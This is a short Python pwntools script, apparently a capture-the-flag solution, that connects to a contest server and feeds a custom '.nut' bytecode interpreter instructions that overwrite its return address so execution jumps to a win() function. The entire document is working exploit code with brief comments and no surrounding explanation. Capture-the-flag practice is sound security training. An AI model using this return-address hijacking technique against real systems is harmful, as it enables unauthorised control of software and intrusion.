from pwn import *

context(log_level="debug")

r = remote("challs.pwnoh.io", 13430)

sl = r.sendline

r.recvuntil(b"Send your .nut program:\n")

# cells[0] = 0x2014
sl(f"PUT {0x805}".encode())
for i in range(4):
    sl(b"ADD")

# addr = 0x2014
sl(b"LD")
sl(b"JMP")

# overwrite return address with address of win()
sl(f"PUT {-0x312}".encode())
sl(b"ADD")  # add 0x312 to return address

# return interpreter() => call win()
sl(b"END")

r.interactive()
